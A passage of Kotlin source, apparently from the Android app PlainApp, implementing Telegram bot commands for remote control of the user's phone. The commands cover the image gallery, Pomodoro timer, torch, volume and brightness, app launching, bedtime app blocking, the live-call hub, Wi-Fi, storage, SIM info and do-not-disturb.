                val msg = if (offset == 0) "🖼 No images found." else "🖼 No more images."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }

            // If paging from a callback, acknowledge the old nav message first
            if (editMessageId != null) {
                TelegramApiClient.editMessageText(token, chatId, editMessageId, "⏳ Loading page…")
            }

            sendUploadPhoto()

            // Build per-photo captions and create 400px thumbnails (kept in sync)
            val thumbFiles = mutableListOf<File>()
            val captions = mutableListOf<String>()
            pageItems.forEachIndexed { i, img ->
                val num = offset + i + 1
                val cap = "<b>${num}. ${htmlEsc(img.title.take(55))}</b>\n" +
                        "📐 ${img.width}×${img.height}  📦 ${humanSize(img.size)}\n" +
                        "🕐 ${fmtTime(img.createdAt.toEpochMilliseconds())}"
                val thumb = createImageThumbnail(img.path, 400)
                val fileToSend = thumb ?: run {
                    val orig = File(img.path)
                    if (orig.exists() && orig.length() < 10 * 1024 * 1024L) orig else null
                }
                if (fileToSend != null) {
                    thumbFiles.add(fileToSend)
                    captions.add(cap)
                }
            }

            // Send the album
            if (thumbFiles.isNotEmpty()) {
                TelegramApiClient.sendMediaGroup(token, chatId, thumbFiles, captions)
            }

            // Clean up temp thumbnails
            thumbFiles.forEach { f ->
                if (f.name.startsWith("tg_thumb_")) f.delete()
            }

            // Send nav message with download + page buttons
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, img ->
                rows.add(listOf("📥 ${offset + i + 1}. ${img.title.take(30)}" to "img_get:${pathToken(img.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "img_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "img_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            val header = "🖼 <b>Gallery</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a button to send the full-resolution photo.</i>"
            sendMessage(header, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read images: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun createImageThumbnail(sourcePath: String, maxPx: Int = 400): File? {
        return try {
            // Read bounds only first to compute sample size
            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
            android.graphics.BitmapFactory.decodeFile(sourcePath, bounds)
            val w = bounds.outWidth; val h = bounds.outHeight
            if (w <= 0 || h <= 0) return null
            // Calculate sample size so decoded image is at most 2× target
            var sample = 1
            while ((w / sample) > maxPx * 2 || (h / sample) > maxPx * 2) sample *= 2
            val decOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
            val bmp = android.graphics.BitmapFactory.decodeFile(sourcePath, decOpts) ?: return null
            // Scale to exactly maxPx on the longest side
            val scale = minOf(1f, maxPx.toFloat() / maxOf(bmp.width, bmp.height))
            val tw = (bmp.width * scale).toInt().coerceAtLeast(1)
            val th = (bmp.height * scale).toInt().coerceAtLeast(1)
            val thumb = if (scale < 1f) android.graphics.Bitmap.createScaledBitmap(bmp, tw, th, true) else bmp
            if (thumb !== bmp) bmp.recycle()
            val f = File.createTempFile("tg_thumb_", ".jpg", MainApp.instance.cacheDir)
            java.io.FileOutputStream(f).use { out -> thumb.compress(android.graphics.Bitmap.CompressFormat.JPEG, 82, out) }
            thumb.recycle()
            f
        } catch (_: Throwable) { null }
    }

    private suspend fun cbSendMediaImage(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Image gone."); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadPhoto()
        val ok = TelegramApiClient.sendPhoto(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
        if (!ok) {
            // Photo can fail for huge images; fall back to document.
            val ok2 = TelegramApiClient.sendDocument(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
            if (!ok2) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
        }
    }

    // ---------------- Pomodoro ----------------

    private suspend fun cmdPomodoro(args: List<String>) {
        val sub = args.firstOrNull()?.lowercase()
        when (sub) {
            "start", "go" -> {
                val secs = try { PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60 } catch (_: Throwable) { 25 * 60 }
                sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
                renderPomodoroStatus(editMessageId = null)
            }
            "pause" -> { sendEvent(HttpApiEvents.PomodoroPauseEvent()); renderPomodoroStatus(editMessageId = null) }
            "stop", "reset" -> { sendEvent(HttpApiEvents.PomodoroStopEvent()); renderPomodoroStatus(editMessageId = null) }
            else -> renderPomodoroStatus(editMessageId = null)
        }
    }

    private suspend fun renderPomodoroStatus(editMessageId: Long?) {
        try {
            val settings = PomodoroSettingsPreference.getValueAsync(MainApp.instance)
            val today = com.ismartcoding.plain.helpers.TimeHelper.now()
                .toLocalDateTime(kotlinx.datetime.TimeZone.currentSystemDefault()).date.toString()
            val dao = com.ismartcoding.plain.db.AppDatabase.instance.pomodoroItemDao()
            val rec = try { dao.getByDate(today) } catch (_: Throwable) { null }
            val completed = rec?.completedCount ?: 0
            val sb = StringBuilder("🍅 <b>Pomodoro</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📅 Today: <b>$today</b>\n")
            sb.append("✅ Completed: <b>$completed</b> sessions\n")
            sb.append("⏱ Work: ${settings.workDuration} min  ·  Short break: ${settings.shortBreakDuration} min  ·  Long break: ${settings.longBreakDuration} min\n")
            sb.append("🔁 Long break every: ${settings.pomodorosBeforeLongBreak} sessions\n\n")
            sb.append("<i>Tap below to control the timer on the device.</i>")
            val rows = listOf(
                listOf("▶️ Start" to "pom_start", "⏸ Pause" to "pom_pause"),
                listOf("⏹ Stop" to "pom_stop", "🔄 Refresh" to "pom_refresh"),
            )
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Pomodoro error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Torch ----------------

    private suspend fun cmdTorch(args: List<String>) {
        val sub = args.firstOrNull()?.lowercase()
        try {
            when (sub) {
                "on", "1", "true" -> UtilitiesHelper.setTorch(true)
                "off", "0", "false" -> UtilitiesHelper.setTorch(false)
                "toggle" -> UtilitiesHelper.setTorch(!UtilitiesHelper.isTorchOn())
                null, "" -> { /* just show state */ }
                else -> { sendMessage("Usage: /torch [on|off|toggle]"); return }
            }
        } catch (e: Exception) {
            sendMessage("❌ Torch failed: ${htmlEsc(e.message ?: "")}")
            return
        }
        renderTorchState(editMessageId = null)
    }

    private suspend fun renderTorchState(editMessageId: Long?) {
        val on = try { UtilitiesHelper.isTorchOn() } catch (_: Throwable) { false }
        val sb = StringBuilder("🔦 <b>Flashlight</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (on) "🟢 ON" else "⚪ OFF"}</b>")
        val rows = listOf(listOf("🔦 ON" to "torch_on", "⚪ OFF" to "torch_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Speak / Vibrate / Show / Wake ----------------

    private suspend fun cmdSpeak(text: String) {
        val say = text.trim()
        if (say.isEmpty()) {
            pendingInput = "speak_text"
            sendMessage("🗣 <b>Text-to-speech</b>\n\nReply with the text to speak on the device.\nSend any /command to cancel.")
            return
        }
        UtilitiesHelper.speak(say)
        sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
    }

    private suspend fun cmdVibrate(args: List<String>) {
        val secs = args.firstOrNull()?.toIntOrNull() ?: 1
        val ms = (secs.coerceIn(1, 10)) * 1000L
        UtilitiesHelper.vibrate(ms)
        sendMessage("📳 Vibrating for ${ms / 1000}s")
    }

    private suspend fun cmdFindPhone(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "on", "start" -> { LocateRingService.start(); renderFindPhoneState(editMessageId = null) }
            "off", "stop" -> { LocateRingService.stop(); renderFindPhoneState(editMessageId = null) }
            else -> renderFindPhoneState(editMessageId = null)
        }
    }

    private suspend fun renderFindPhoneState(editMessageId: Long?) {
        val running = LocateRingService.running
        val sb = StringBuilder("🚨 <b>Locate phone</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (running) "🚨 RINGING" else "🔕 OFF"}</b>\n\n")
        sb.append("<i>The device will play a loud alarm sound at full volume to help you find it.</i>")
        val rows = listOf(listOf("🚨 Start alarm" to "fp_on", "🔕 Stop" to "fp_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdShow(text: String) {
        val msg = text.trim()
        if (msg.isEmpty()) {
            pendingInput = "show_text"
            sendMessage("💡 <b>Show banner on device</b>\n\nReply with the message to show as a screen overlay.\nSend any /command to cancel.")
            return
        }
        if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
            sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
            return
        }
        MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
        sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
    }

    private suspend fun cmdWake(args: List<String>) {
        val secs = (args.firstOrNull()?.toIntOrNull() ?: 10).coerceIn(1, 120)
        UtilitiesHelper.wakeScreen(secs * 1000L)
        sendMessage("📺 Screen woken for ${secs}s.")
    }

    // ---------------- Brightness / Volume ----------------

    private suspend fun cmdBrightness(args: List<String>) {
        val pct = args.firstOrNull()?.toIntOrNull()
        if (pct == null) { renderBrightnessState(editMessageId = null); return }
        val ok = UtilitiesHelper.setBrightness(pct.coerceIn(0, 100))
        if (!ok) { sendMessage("⛔ WRITE_SETTINGS permission not granted. Enable it for PlainApp first."); return }
        renderBrightnessState(editMessageId = null)
    }

    private suspend fun renderBrightnessState(editMessageId: Long?) {
        val cur = try { UtilitiesHelper.getBrightness() } catch (_: Throwable) { 0 }
        val sb = StringBuilder("🔆 <b>Brightness</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: <b>${cur}%</b>\n\n<i>Tap a preset to change.</i>")
        val rows = listOf(
            listOf("0%" to "br_set:0", "25%" to "br_set:25", "50%" to "br_set:50"),
            listOf("75%" to "br_set:75", "100%" to "br_set:100"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdVolume(args: List<String>) {
        val a0 = args.getOrNull(0)?.lowercase()
        val a1 = args.getOrNull(1)?.toIntOrNull()
        if (a0 != null && a1 != null) {
            UtilitiesHelper.setVolume(a0, a1.coerceIn(0, 100))
        } else if (a0 != null && args.size == 1 && a0.toIntOrNull() != null) {
            UtilitiesHelper.setVolume("media", a0.toInt().coerceIn(0, 100))
        }
        renderVolumeState(editMessageId = null)
    }

    private suspend fun renderVolumeState(editMessageId: Long?) {
        val v = try { UtilitiesHelper.getVolumes() } catch (_: Throwable) { emptyMap() }
        val sb = StringBuilder("🔊 <b>Volume Levels</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        v.forEach { (k, p) -> sb.append("• <b>$k</b>: ${p}%\n") }
        sb.append("\n<i>Tap a preset to change media volume.</i>")
        val rows = listOf(
            listOf("🔇 0%" to "vol_set:media:0", "25%" to "vol_set:media:25", "50%" to "vol_set:media:50"),
            listOf("75%" to "vol_set:media:75", "🔊 100%" to "vol_set:media:100"),
            listOf("📞 Ring 50%" to "vol_set:ring:50", "🔔 Notif 50%" to "vol_set:notification:50"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Launch app ----------------

    private suspend fun cmdLaunch(args: List<String>) {
        if (args.isEmpty()) { renderLaunchAppsPage("", 0, editMessageId = null); return }
        val arg = args.joinToString(" ")
        // Direct launch if it looks like a package name
        if (arg.contains('.') && !arg.contains(' ')) {
            val ok = AppLauncherHelper.launch(arg)
            if (ok) { sendMessage("🚀 Launched <code>${htmlEsc(arg)}</code> on the device."); return }
        }
        renderLaunchAppsPage(arg.lowercase(), 0, editMessageId = null)
    }

    private suspend fun renderLaunchAppsPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val all = AppLauncherHelper.list(MainApp.instance, query).filter { it.launchable }
            val pageSize = 10
            val pageItems = all.drop(offset).take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🚀 No launchable apps match <code>${htmlEsc(query)}</code>" else "🚀 No more apps."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🚀 <b>Launch app</b> · ${offset + 1}–${offset + pageItems.size} of ${all.size}\n<i>Tap an app to open it on the device.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                sb.append("${offset + i + 1}. 📱 <b>${htmlEsc(a.label)}</b>\n   <code>${htmlEsc(a.packageName)}</code>\n\n")
                rows.add(listOf("${offset + i + 1}. ${a.label.take(34)}" to "lrun:${pkgToken(a.packageName)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "lpg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < all.size) nav.add("Next ▶️" to "lpg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Stop TTS / Toast / Mobile-data deep-link ----------------

    private fun cmdStopSpeak() {
        UtilitiesHelper.stopSpeaking()
        sendMessage("🤫 Stopped speaking.")
    }

    private suspend fun cmdToast(text: String) {
        val msg = text.trim()
        if (msg.isEmpty()) {
            pendingInput = "toast_text"
            sendMessage("💬 <b>Toast on device</b>\n\nReply with the text to flash on the device screen.\nSend any /command to cancel.")
            return
        }
        UtilitiesHelper.toast(msg, longToast = msg.length > 40)
        sendMessage("💬 Toast shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
    }

    private fun cmdDataSettings() {
        val ok = UtilitiesHelper.openDataSettings()
        if (ok) sendMessage("📡 Opened mobile-data settings on the device.")
        else sendMessage("❌ Could not open the settings page.")
    }

    // ---------------- Bedtime (parental control) ----------------

    private suspend fun cmdBedtime(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "off", "stop", "disable" -> {
                val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                    com.ismartcoding.plain.services.AppBlockHelper.Bedtime(false, cur.startMinutes, cur.endMinutes, cur.packages)
                )
                renderBedtimeState(editMessageId = null)
            }
            "on", "start", "enable" -> {
                val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                    com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, cur.startMinutes, cur.endMinutes, cur.packages)
                )
                renderBedtimeState(editMessageId = null)
            }
            "set" -> {
                // /bedtime set 22:00 06:30
                val rest = args.drop(1).joinToString(" ").trim()
                val ok = parseAndApplyBedtime(rest)
                if (ok) renderBedtimeState(editMessageId = null)
                else {
                    pendingInput = "bedtime_set"
                    sendMessage("🌙 <b>Set bedtime window</b>\n\nReply with the start and end in 24-hour format, e.g. <code>22:00 06:30</code>.\nSend <code>off</code> to disable.")
                }
            }
            else -> renderBedtimeState(editMessageId = null)
        }
    }

    /**
     * Accepts "HH:MM HH:MM" or "off"/"disable". Returns true if it parsed and was applied.
     * Preserves the existing package allow-list — bedtime only blocks the packages already
     * configured from the web panel.
     */
    private fun parseAndApplyBedtime(raw: String): Boolean {
        val s = raw.trim().lowercase()
        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
        if (s == "off" || s == "disable" || s == "stop") {
            com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                com.ismartcoding.plain.services.AppBlockHelper.Bedtime(false, cur.startMinutes, cur.endMinutes, cur.packages)
            )
            return true
        }
        val tokens = s.split(Regex("\\s+|to|-|,")).filter { it.isNotBlank() }
        if (tokens.size < 2) return false
        val start = parseHm(tokens[0]) ?: return false
        val end = parseHm(tokens[1]) ?: return false
        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, start, end, cur.packages)
        )
        return true
    }

    private fun parseHm(t: String): Int? {
        val parts = t.split(":")
        if (parts.size != 2) return null
        val h = parts[0].toIntOrNull() ?: return null
        val m = parts[1].toIntOrNull() ?: return null
        if (h !in 0..23 || m !in 0..59) return null
        return h * 60 + m
    }

    private fun fmtHm(minutes: Int): String =
        "%02d:%02d".format((minutes / 60).coerceIn(0, 23), (minutes % 60).coerceIn(0, 59))

    private suspend fun renderBedtimeState(editMessageId: Long?) {
        val b = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
        val sb = StringBuilder("🌙 <b>Bedtime</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (b.enabled) "🟢 ON" else "⚪ OFF"}</b>\n")
        sb.append("Window: <b>${fmtHm(b.startMinutes)} → ${fmtHm(b.endMinutes)}</b>\n")
        sb.append("Apps in scope: <b>${b.packages.size}</b>")
        if (b.packages.isNotEmpty()) {
            sb.append("\n<i>${htmlEsc(b.packages.take(8).joinToString(", "))}${if (b.packages.size > 8) "…" else ""}</i>")
        }
        sb.append("\n\n<i>The bedtime app list is managed from the web panel.</i>")
        val rows = listOf(
            listOf("🟢 Enable" to "bt_on", "⚪ Disable" to "bt_off"),
            listOf("🌃 22:00–06:00" to "bt_w:1320:360", "🌃 23:00–07:00" to "bt_w:1380:420"),
            listOf("📚 21:00–06:30" to "bt_w:1260:390", "✏️ Custom…" to "bt_custom"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- App launch history ----------------

    private suspend fun cmdLaunches(args: List<String>) {
        val n = (args.firstOrNull()?.toIntOrNull() ?: 25).coerceIn(1, 200)
        val list = com.ismartcoding.plain.services.AppBlockHelper.getHistory().asReversed().take(n)
        if (list.isEmpty()) { sendMessage("🚀 No app launches recorded yet."); return }
        val sb = StringBuilder("🚀 <b>Recent app launches</b> · last ${list.size}\n━━━━━━━━━━━━━━━━━━━━\n")
        list.forEachIndexed { i, h ->
            val name = try { com.ismartcoding.plain.features.PackageHelper.getLabel(h.pkg).ifEmpty { h.pkg } }
                       catch (_: Throwable) { h.pkg }
            sb.append("${i + 1}. <b>${htmlEsc(name)}</b>\n")
            sb.append("   <code>${htmlEsc(h.pkg)}</code> · 🕐 ${fmtTime(h.ts)}\n\n")
        }
        val markup = TelegramApiClient.inlineKeyboard(listOf(
            listOf("🗑 Clear history" to "launches_clear", "🔄 Refresh" to "launches_refresh"),
        ))
        sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Live call hub ----------------

    private suspend fun cmdLiveCall() {
        renderLiveCallState(editMessageId = null)
    }

    private suspend fun renderLiveCallState(editMessageId: Long?) {
        val s = com.ismartcoding.plain.services.LiveCallTracker.snapshot()
        val sb = StringBuilder("📞 <b>Live call hub</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        val emoji = when (s.state) {
            "ringing" -> "📲"
            "active" -> "🟢"
            "ended" -> "⚪"
            else -> "⚪"
        }
        sb.append("State: <b>$emoji ${s.state.uppercase()}</b>\n")
        if (s.state != "idle") {
            sb.append("Direction: <b>${s.direction}</b>\n")
            sb.append("Source: <b>${htmlEsc(if (s.appName.isNotBlank()) s.appName else s.source)}</b>\n")
            if (s.display.isNotBlank()) {
                val contactName = lookupContactName(s.display)
                if (contactName.isNotBlank()) {
                    sb.append("Who: <b>${htmlEsc(contactName)}</b>\n")
                    sb.append("📱 <code>${htmlEsc(s.display)}</code>\n")
                } else {
                    sb.append("Who: <b>${htmlEsc(s.display)}</b>\n")
                }
            }
            if (s.acceptedAt > 0) {
                val secs = ((com.ismartcoding.plain.helpers.TimeHelper.now().toEpochMilliseconds() - s.acceptedAt) / 1000).coerceAtLeast(0)
                sb.append("Duration: <b>${secs / 60}m ${secs % 60}s</b>\n")
            } else if (s.startedAt > 0) {
                sb.append("Since: 🕐 ${fmtTime(s.startedAt)}\n")
            }
            sb.append("Mute: <b>${if (s.muted) "🔇 muted" else "🎙 live"}</b>")
            if (s.silenced) sb.append("  ·  <i>silenced by Android</i>")
            sb.append("\n")
        } else {
            sb.append("\n<i>No call in progress.</i>")
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (s.state == "ringing") {
            rows.add(listOf("✅ Accept" to "lc_accept", "🔚 End" to "lc_end"))
        } else if (s.state == "active") {
            rows.add(listOf(
                if (s.muted) "🎙 Unmute" to "lc_unmute" else "🔇 Mute" to "lc_mute",
                "🔚 End" to "lc_end",
            ))
        }
        rows.add(listOf("🔄 Refresh" to "lc_refresh"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Wi-Fi ----------------

    private suspend fun cmdWifi(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true" -> WifiControlHelper.setWifiEnabled(true, MainApp.instance)
            "off", "0", "false" -> WifiControlHelper.setWifiEnabled(false, MainApp.instance)
            else -> { /* show state */ }
        }
        renderWifiState(editMessageId = null)
    }

    private suspend fun renderWifiState(editMessageId: Long?) {
        try {
            val s = WifiControlHelper.state(MainApp.instance)
            val sb = StringBuilder("📶 <b>Wi-Fi</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("State: <b>${if (s.enabled) "🟢 ON" else "⚪ OFF"}</b>\n")
            if (s.enabled) {
                if (s.connectedSsid.isNotBlank()) sb.append("Network: <b>${htmlEsc(s.connectedSsid)}</b>\n")
                if (s.ipv4.isNotBlank()) sb.append("IP: <code>${s.ipv4}</code>\n")
                if (s.linkSpeedMbps > 0) sb.append("Speed: ${s.linkSpeedMbps} Mbps\n")
                if (s.rssi > -127) sb.append("Signal: ${s.rssi} dBm\n")
                if (s.frequencyMhz > 0) sb.append("Freq: ${s.frequencyMhz} MHz\n")
            }
            sb.append("Hotspot: ${s.hotspotState}\n")
            val rows = listOf(listOf("🟢 Turn ON" to "wifi_on", "⚪ Turn OFF" to "wifi_off"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Wi-Fi error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Network usage ----------------

    private suspend fun cmdNetUsage(args: List<String>) {
        val days = (args.firstOrNull()?.toIntOrNull() ?: 7).coerceIn(1, 90)
        sendTyping()
        try {
            if (!NetworkUsageHelper.usageAccessGranted(MainApp.instance)) {
                sendMessage("⛔ Network usage requires the <b>Usage Access</b> permission.\nGrant it for PlainApp in Android Settings → Special Access → Usage Access.")
                return
            }
            val w = NetworkUsageHelper.query(days, MainApp.instance)
            val sb = StringBuilder("📊 <b>Network usage</b> · last $days day(s)\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📥 Total RX: <b>${humanSize(w.totalRx)}</b>\n")
            sb.append("📤 Total TX: <b>${humanSize(w.totalTx)}</b>\n\n")
            sb.append("<b>Top apps:</b>\n")
            w.apps.take(15).forEachIndexed { i, app ->
                sb.append("${i + 1}. <b>${htmlEsc(app.label.take(30))}</b>  ·  ${humanSize(app.rxBytes + app.txBytes)}\n")
                sb.append("   📶 Wi-Fi ${humanSize(app.rxBytesWifi + app.txBytesWifi)}  ·  📡 Mobile ${humanSize(app.rxBytesMobile + app.txBytesMobile)}\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Net usage error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /storage ====================

    private fun cmdStorage() {
        sendTyping()
        try {
            val ctx = MainApp.instance
            val internal = FileSystemHelper.getInternalStorageStats()
            val sb = StringBuilder("💾 <b>Storage</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            fun formatLine(label: String, s: com.ismartcoding.plain.features.file.DStorageStatsItem) {
                val used = s.totalBytes - s.freeBytes
                val pct = if (s.totalBytes > 0) (used * 100 / s.totalBytes).toInt() else 0
                val bar = "█".repeat(pct / 10) + "░".repeat(10 - pct / 10)
                sb.append("$label\n  $bar $pct%\n")
                sb.append("  Used: <b>${humanSize(used)}</b>  Free: <b>${humanSize(s.freeBytes)}</b>  Total: ${humanSize(s.totalBytes)}\n\n")
            }
            formatLine("📱 Internal", internal)
            val sd = FileSystemHelper.getSDCardStorageStats(ctx)
            if (sd.totalBytes > 0) formatLine("💳 SD Card", sd)
            val usbs = FileSystemHelper.getUSBStorageStats()
            usbs.forEachIndexed { i, u -> if (u.totalBytes > 0) formatLine("🔌 USB ${i + 1}", u) }
            // Category breakdown
            try {
                val bd = SystemControlHelper.getStorageBreakdown()
                sb.append("📊 <b>Category Breakdown</b>\n")
                data class Cat(val icon: String, val label: String, val bytes: Long)
                listOf(
                    Cat("📱", "Apps", bd.appsBytes),
                    Cat("🖼", "Images", bd.imagesBytes),
                    Cat("🎬", "Videos", bd.videosBytes),
                    Cat("🎵", "Audio", bd.audioBytes),
                    Cat("📄", "Documents", bd.documentsBytes),
                    Cat("🗑", "Cache", bd.cacheBytes),
                    Cat("📦", "Other", bd.otherBytes),
                ).filter { it.bytes > 0 }.forEach { c ->
                    sb.append("  ${c.icon} ${c.label}: <b>${humanSize(c.bytes)}</b>\n")
                }
            } catch (_: Exception) {}
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Storage error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /sim ====================

    private fun cmdSim() {
        sendTyping()
        try {
            val sims = com.ismartcoding.plain.helpers.SimInfoHelper.getAll()
            if (sims.isEmpty()) {
                sendMessage("📡 No SIM cards detected.\n<i>READ_PHONE_STATE permission may be required.</i>")
                return
            }
            val sb = StringBuilder("📡 <b>SIM Info</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            sims.forEach { s ->
                val name = s.carrierName.ifBlank { s.operatorName.ifBlank { "SIM ${s.slotIndex + 1}" } }
                sb.append("📶 <b>SIM ${s.slotIndex + 1}</b> — ${htmlEsc(name)}\n")
                if (s.phoneNumber.isNotBlank()) sb.append("  📱 Number: <code>${htmlEsc(s.phoneNumber)}</code>\n")
                sb.append("  📡 Network: <b>${htmlEsc(s.networkTypeName)}</b>\n")
                if (s.mcc.isNotBlank() || s.mnc.isNotBlank()) sb.append("  MCC/MNC: <code>${s.mcc}/${s.mnc}</code>\n")
                val filled = s.signalBars.coerceIn(0, 5)
                sb.append("  📶 Signal: ${"█".repeat(filled)}${"░".repeat(5 - filled)} (${filled}/5)\n")
                sb.append("  State: <b>${s.simState}</b>")
                if (s.isRoaming) sb.append(" ⚠️ Roaming")
                if (s.isDataActive) sb.append(" ✅ Data Active")
                sb.append("\n")
                if (s.iccid.isNotBlank()) sb.append("  ICCID: <code>${htmlEsc(s.iccid)}</code>\n")
                sb.append("\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ SIM error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /dnd ====================

    private fun cmdDnd(args: List<String>) {
        val nm = MainApp.instance.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        if (!nm.isNotificationPolicyAccessGranted) {
            sendMessage("❌ DND access not granted.\n\nGo to <b>Settings → Apps → Special app access → Do Not Disturb access</b> and enable PlainApp.")
            return
        }
        val currentOn = nm.currentInterruptionFilter == android.app.NotificationManager.INTERRUPTION_FILTER_NONE
        val setOn = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            "toggle" -> !currentOn
            else -> null
        }
        if (setOn != null) {
            nm.setInterruptionFilter(if (setOn) android.app.NotificationManager.INTERRUPTION_FILTER_NONE else android.app.NotificationManager.INTERRUPTION_FILTER_ALL)
        }
        val isOn = nm.currentInterruptionFilter == android.app.NotificationManager.INTERRUPTION_FILTER_NONE
